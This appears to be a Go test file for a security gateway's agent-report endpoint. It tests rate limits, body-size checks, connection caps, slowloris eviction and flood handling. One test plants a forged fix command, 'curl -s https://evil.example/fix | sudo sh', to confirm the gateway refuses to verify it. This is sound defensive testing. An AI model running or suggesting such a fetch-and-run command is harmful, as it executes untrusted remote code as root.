//go:build !release

package hosts

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/deutschland-schild/schild/contract"
	"github.com/deutschland-schild/schild/contract/testkeys"
)

// TestLimiterEvictsOnlyTheOldest: a flood of new keys evicts the least
// recently used keys one by one; every other counter stays.
func TestLimiterEvictsOnlyTheOldest(t *testing.T) {
	now := time.Now()
	l := newLimiterN(100)
	for i := 0; i < 11; i++ {
		l.fail("enrol-fail:victim", now)
	}
	if l.allow("enrol-fail:victim", now, 0) {
		t.Fatal("precondition: victim not limited")
	}
	for i := 0; i < 99; i++ { // fills the table, victim stays (it is in use)
		l.allow(fmt.Sprintf("10.0.%d.%d", i/250, i%250), now, 120)
	}
	if l.allow("enrol-fail:victim", now, 0) {
		t.Fatal("victim reset by 99 other keys")
	}
	if len(l.m) != 100 || l.ll.Len() != 100 {
		t.Fatalf("size %d/%d", len(l.m), l.ll.Len())
	}
	// Past the capacity the oldest unused key goes, never all of them.
	for i := 0; i < 500; i++ {
		l.allow(fmt.Sprintf("10.1.%d.%d", i/250, i%250), now, 120)
	}
	if len(l.m) != 100 {
		t.Fatalf("size %d after eviction", len(l.m))
	}
	// Bounded per key: a hot key keeps limit+1 timestamps at most.
	for i := 0; i < 10000; i++ {
		l.allow("hot", now, 120)
	}
	if n := len(l.m["hot"].Value.(*limEntry).events); n > 121 {
		t.Fatalf("hot key keeps %d events", n)
	}
	// Refund takes the newest event back.
	l2 := newLimiterN(10)
	for i := 0; i < 3; i++ {
		l2.allow("a", now, 3)
	}
	if l2.allow("a", now, 3) {
		t.Fatal("4th allowed")
	}
	l2.refund("a")
	l2.refund("a")
	if !l2.allow("a", now, 3) {
		t.Fatal("refund did not free a slot")
	}
}

func TestPeerKeyIPv6Prefix(t *testing.T) {
	if a, b := peerOf("[2001:db8:1:2::1]:1"), peerOf("[2001:db8:1:2:ffff::9]:2"); a != b || a != "2001:db8:1:2::/64" {
		t.Fatalf("%s %s", a, b)
	}
	if peerOf("192.0.2.7:443") != "192.0.2.7" || peerOf("[::ffff:192.0.2.7]:443") != "192.0.2.7" {
		t.Fatal("v4")
	}
}

// TestBodyLimitsBeforeReading: no Content-Length -> 411, too large -> 413,
// both without reading the body; a busy body budget -> 503 that is not
// charged to the sender's request budget.
func TestBodyLimitsBeforeReading(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	g := newGW(t, "gw-1", now, 30, "")
	g.enrolKey(t, "agent-a", "enrolled")
	h := g.Handler()

	tripwire := &tripReader{}
	req := httptest.NewRequest(http.MethodPost, "/v0/agent/report", tripwire)
	req.ContentLength = -1
	req.RemoteAddr = "10.66.9.1:1"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusLengthRequired || tripwire.read {
		t.Fatalf("no length: %d read=%v", rec.Code, tripwire.read)
	}
	tripwire = &tripReader{}
	req = httptest.NewRequest(http.MethodPost, "/v0/agent/report", tripwire)
	req.ContentLength = 10 << 20
	req.RemoteAddr = "10.66.9.1:1"
	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusRequestEntityTooLarge || tripwire.read || !strings.Contains(rec.Body.String(), `"oversize"`) {
		t.Fatalf("oversize: %d read=%v %s", rec.Code, tripwire.read, rec.Body.String())
	}

	// Budget exhausted (held by someone else): 503, nothing read, and 500
	// such answers do not use up the address's 120 requests.
	if !g.bodies.take(g.bodies.max) {
		t.Fatal("take")
	}
	for i := 0; i < 500; i++ {
		tripwire = &tripReader{}
		req = httptest.NewRequest(http.MethodPost, "/v0/agent/report", tripwire)
		req.ContentLength = 1000
		req.RemoteAddr = "10.66.9.2:1"
		rec = httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != http.StatusServiceUnavailable || tripwire.read {
			t.Fatalf("busy %d: %d read=%v", i, rec.Code, tripwire.read)
		}
	}
	g.bodies.give(g.bodies.max)
	a := testkeys.Signer("agent-a")
	raw := signAs(t, contract.KindAgentReport.PayloadType(), reviewReport(t, now, a.KeyID(), "gw-1", nonceN(1)), a)
	if code, got := serve(t, g, "/v0/agent/report", "10.66.9.2", raw); got != "accepted" {
		t.Fatalf("after 500 busy answers: %d %s", code, got)
	}
}

type tripReader struct{ read bool }

func (r *tripReader) Read(p []byte) (int, error) { r.read = true; return 0, io.EOF }

// TestEnrolledLaneUnderFlood: an address whose request budget is used up
// by junk still gets an enrolled agent's report through (own budget via the
// key header), and a forged header does not open the lane.
func TestEnrolledLaneUnderFlood(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	g := newGW(t, "gw-1", now, 30, "")
	id := g.enrolKey(t, "agent-a", "enrolled")
	a := testkeys.Signer("agent-a")
	for i := 0; i < 130; i++ {
		serve(t, g, "/v0/agent/report", "10.66.10.1", []byte("junk"))
	}
	if code, _ := serve(t, g, "/v0/agent/report", "10.66.10.1", []byte("junk")); code != 429 {
		t.Fatalf("precondition: address not limited (%d)", code)
	}
	post := func(nonce int, header string, s interface{ KeyID() string }) (int, string) {
		raw := signAs(t, contract.KindAgentReport.PayloadType(), reviewReport(t, now, a.KeyID(), "gw-1", nonceN(nonce)), a)
		req := httptest.NewRequest(http.MethodPost, "/v0/agent/report", bytes.NewReader(raw))
		req.RemoteAddr = "10.66.10.1:4000"
		req.Header.Set(AgentKeyHeader, header)
		rec := httptest.NewRecorder()
		g.Handler().ServeHTTP(rec, req)
		return rec.Code, rec.Body.String()
	}
	if code, body := post(1, a.KeyID(), a); code != 200 || !strings.Contains(body, `"accepted"`) {
		t.Fatalf("enrolled agent from a flooded address: %d %s", code, body)
	}
	if h := historyLen(t, g, id); h != 1 {
		t.Fatalf("history %d", h)
	}
	// A header naming an unknown key gives no lane.
	if code, _ := post(2, "nobody/agent/2026-10", a); code != 429 {
		t.Fatalf("unknown key header opened a lane: %d", code)
	}
}

// TestListenerConnectionCaps: per-peer and global connection caps close
// excess connections at accept; slow bodies are cut off.
func TestListenerConnectionCaps(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	lim := DefaultLimits
	lim.MaxConnsPerPeer, lim.MaxConns, lim.HeaderTimeout, lim.MinBodyRate = 3, 5, 3*time.Second, 64<<10
	g := newGWLimits(t, now, &lim)
	srv, err := g.Server()
	if err != nil {
		t.Fatal(err)
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	g.conns = newLimitListener(ln, lim.MaxConns, lim.MaxConnsPerPeer)
	go func() { _ = srv.ServeTLS(g.conns, "", "") }()
	t.Cleanup(func() { _ = srv.Close() })
	addr := ln.Addr().String()
	var held []net.Conn
	for i := 0; i < 6; i++ {
		c, err := net.Dial("tcp", addr)
		if err != nil {
			t.Fatal(err)
		}
		held = append(held, c)
	}
	time.Sleep(200 * time.Millisecond)
	// Connections 4..6 from the same peer were closed by the server.
	closed := 0
	for _, c := range held {
		_ = c.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		if _, err := c.Read(make([]byte, 1)); err == io.EOF {
			closed++
		}
	}
	if closed != 3 {
		t.Fatalf("%d of 6 connections closed, want 3", closed)
	}
	g.conns.mu.Lock()
	open := g.conns.open
	g.conns.mu.Unlock()
	if open != 3 {
		t.Fatalf("open %d", open)
	}
	// Held connections without a handshake are closed after HeaderTimeout.
	time.Sleep(lim.HeaderTimeout + 500*time.Millisecond)
	g.conns.mu.Lock()
	open = g.conns.open
	g.conns.mu.Unlock()
	if open != 0 {
		t.Fatalf("idle handshakes still open: %d", open)
	}
	for _, c := range held {
		c.Close()
	}
	// A slow body: 100 KiB declared, sent at a trickle -> cut off; the
	// budget is free again afterwards.
	conn, err := tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	fmt.Fprintf(conn, "POST /v0/agent/report HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n", 100<<10)
	start := time.Now()
	deadline := 2*time.Second + time.Duration(int64(100<<10)*int64(time.Second)/lim.MinBodyRate)
	var cut bool
	for time.Since(start) < deadline+5*time.Second {
		if _, err := conn.Write(bytes.Repeat([]byte("a"), 1024)); err != nil {
			cut = true
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if !cut {
		t.Fatal("slow body not cut off")
	}
	time.Sleep(100 * time.Millisecond)
	g.bodies.mu.Lock()
	used := g.bodies.used
	g.bodies.mu.Unlock()
	if used != 0 {
		t.Fatalf("budget still holds %d bytes", used)
	}
}

// TestListenerEvictsWaitingAtCap: at the global cap a new connection
// replaces the oldest one still waiting for its headers (distributed
// slowloris, MVP-11 re-measure observation 2); a connection whose request
// is being served is never evicted, and fresh waiting connections (younger
// than evictMinAge) are not either.
func TestListenerEvictsWaitingAtCap(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	lim := DefaultLimits
	lim.MaxConnsPerPeer, lim.MaxConns, lim.HeaderTimeout, lim.MinBodyRate = 100, 4, 10*time.Second, 1
	g := newGWLimits(t, now, &lim)
	srv, err := g.Server()
	if err != nil {
		t.Fatal(err)
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	g.conns = newLimitListener(ln, lim.MaxConns, lim.MaxConnsPerPeer)
	go func() { _ = srv.ServeTLS(g.conns, "", "") }()
	t.Cleanup(func() { _ = srv.Close() })
	addr := ln.Addr().String()
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	open := func() int { g.conns.mu.Lock(); defer g.conns.mu.Unlock(); return g.conns.open }
	healthz := func() error {
		c, err := tls.DialWithDialer(&net.Dialer{Timeout: 2 * time.Second}, "tcp", addr, tlsCfg)
		if err != nil {
			return err
		}
		defer c.Close()
		_ = c.SetDeadline(time.Now().Add(2 * time.Second))
		fmt.Fprint(c, "GET /healthz HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
		b, err := io.ReadAll(c)
		if err != nil && len(b) == 0 {
			return err
		}
		if !strings.HasPrefix(string(b), "HTTP/1.1 200") {
			return fmt.Errorf("answer %q", b)
		}
		return nil
	}

	// One request whose headers are complete and whose body trickles (busy).
	busy, err := tls.Dial("tcp", addr, tlsCfg)
	if err != nil {
		t.Fatal(err)
	}
	defer busy.Close()
	fmt.Fprintf(busy, "POST /v0/agent/report HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n", 1000)
	// Three slowloris connections: TLS done, headers never finished.
	var slow []*tls.Conn
	for i := 0; i < 3; i++ {
		c, err := tls.Dial("tcp", addr, tlsCfg)
		if err != nil {
			t.Fatal(err)
		}
		fmt.Fprint(c, "POST /v0/agent/report HTTP/1.1\r\nHost: x\r\n")
		slow = append(slow, c)
		defer c.Close()
	}
	time.Sleep(100 * time.Millisecond)
	if n := open(); n != 4 {
		t.Fatalf("open %d, want 4 (at cap)", n)
	}
	// All waiting connections are younger than evictMinAge: the new one is closed.
	if err := healthz(); err == nil {
		t.Fatal("fresh waiting connections were evicted")
	}
	time.Sleep(evictMinAge + 100*time.Millisecond)
	// Now a new connection gets through by replacing the oldest waiting one.
	if err := healthz(); err != nil {
		t.Fatalf("healthz at cap: %v", err)
	}
	g.conns.mu.Lock()
	evicted := g.conns.evicted
	g.conns.mu.Unlock()
	if evicted != 1 {
		t.Fatalf("evicted %d, want 1", evicted)
	}
	// The busy request was never evicted: its connection still takes bytes
	// and is counted.
	if _, err := busy.Write([]byte("a")); err != nil {
		t.Fatalf("busy request evicted: %v", err)
	}
	g.conns.mu.Lock()
	var busyLeft int
	for c := range g.conns.conns {
		if c.state.Load() == connBusy {
			busyLeft++
		}
	}
	g.conns.mu.Unlock()
	if busyLeft != 1 {
		t.Fatalf("busy connections %d, want 1", busyLeft)
	}
	// The oldest slowloris connection was the one closed.
	for i, c := range slow {
		_ = c.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		_, err := c.Read(make([]byte, 1))
		if closed := err != nil && !isTimeout(err); closed != (i == 0) {
			t.Fatalf("slowloris connection %d closed=%v (%v)", i, closed, err)
		}
	}
}

func isTimeout(err error) bool {
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// TestNoListenWithoutAddress: agents enabled but no listen address: no
// listener (no public default).
func TestNoListenWithoutAddress(t *testing.T) {
	g := newGWLimits(t, time.Now(), nil)
	g.cfg.HostCheck.Agents.Listen = ""
	if _, err := g.Server(); err != ErrNoListen {
		t.Fatalf("got %v", err)
	}
}

func newGWLimits(t *testing.T, now time.Time, lim *Limits) *testGW {
	t.Helper()
	g := newGW(t, "gw-1", now, 30, "")
	if lim != nil {
		g.lim = *lim
		g.sem = make(chan struct{}, lim.VerifyConcurrency)
		g.bodies, g.laneBodies = &budget{max: lim.BodyBudget}, &budget{max: lim.LaneBudget}
	}
	_ = context.Background
	return g
}

// TestAgentFindingsAnnotated: the host detail of an agent carries the
// gateway's catalogue text per finding; fixes the gateway's check produces
// are verified, a forged one is not.
func TestAgentFindingsAnnotated(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	g := newGW(t, "gw-1", now, 30, "")
	id := g.enrolKey(t, "agent-a", "enrolled")
	a := testkeys.Signer("agent-a")
	p := reviewReport(t, now, a.KeyID(), "gw-1", nonceN(1))
	evil := "curl -s https://evil.example/fix | sudo sh"
	forged := -1
	for i, f := range p.Report.Findings {
		if f.FixCommand != nil && forged < 0 {
			forged = i
			p.Report.Findings[i].FixCommand = &evil
		}
	}
	if forged < 0 {
		t.Fatal("fixture without fix commands")
	}
	if _, got := serve(t, g, "/v0/agent/report", "10.66.11.1", signAs(t, contract.KindAgentReport.PayloadType(), p, a)); got != "accepted" {
		t.Fatal(got)
	}
	d, err := g.Host(context.Background(), id)
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Annotations) != len(p.Report.Findings) {
		t.Fatalf("%d annotations for %d findings", len(d.Annotations), len(p.Report.Findings))
	}
	verified := 0
	for i, an := range d.Annotations {
		f := p.Report.Findings[i]
		if an.ID != f.ID || an.Title == nil || an.Explanation == nil {
			t.Fatalf("annotation %d: %+v", i, an)
		}
		if i == forged && an.FixVerified {
			t.Fatal("forged fix verified")
		}
		if i != forged && f.FixCommand != nil {
			if !an.FixVerified {
				t.Errorf("real fix of %s not verified: %s", f.ID, *f.FixCommand)
			}
			verified++
		}
	}
	if verified == 0 {
		t.Fatal("no verified fix")
	}
	local, err := g.Host(context.Background(), LocalID)
	if err == nil && local.Annotations != nil {
		t.Fatal("local host annotated")
	}
}

// TestEnrolledFloodWithoutHeaderStaysBounded: a (compromised) enrolled
// agent that leaves the header out cannot get past both budgets.
func TestEnrolledFloodWithoutHeaderStaysBounded(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	g := newGW(t, "gw-1", now, 30, "")
	g.enrolKey(t, "agent-a", "enrolled")
	a := testkeys.Signer("agent-a")
	accepted, limited := 0, 0
	for i := 0; i < 400; i++ {
		raw := signAs(t, contract.KindAgentReport.PayloadType(), reviewReport(t, now, a.KeyID(), "gw-1", nonceN(1000+i)), a)
		code, got := serve(t, g, "/v0/agent/report", "10.66.12.1", raw)
		switch {
		case got == "accepted":
			accepted++
		case code == 429:
			limited++
		}
	}
	if accepted > 2*DefaultLimits.AgentRequests+DefaultLimits.PeerRequests || limited == 0 {
		t.Fatalf("accepted %d, limited %d", accepted, limited)
	}
	t.Logf("accepted %d, limited %d", accepted, limited)
}

// TestBodyDeadlineEndsWithBody: the body deadline (2 s plus MinBodyRate)
// covers the body only. Verification and the store write after it keep the
// request's context, however long a busy store makes them take.
func TestBodyDeadlineEndsWithBody(t *testing.T) {
	g := newGW(t, "gw-1", time.Now().UTC(), 30, "")
	ctxErr := make(chan error, 1)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, done, res := g.readBody(w, r, 1024, g.bodies)
		if res != bodyOK {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		defer done()
		time.Sleep(2500 * time.Millisecond) // past the body deadline
		ctxErr <- r.Context().Err()
		_, _ = w.Write(raw)
	}))
	defer srv.Close()
	resp, err := http.Post(srv.URL, "application/json", strings.NewReader(`{"report":"small"}`))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("status %d", resp.StatusCode)
	}
	if err := <-ctxErr; err != nil {
		t.Fatalf("request context ended after the body was read: %v", err)
	}
}
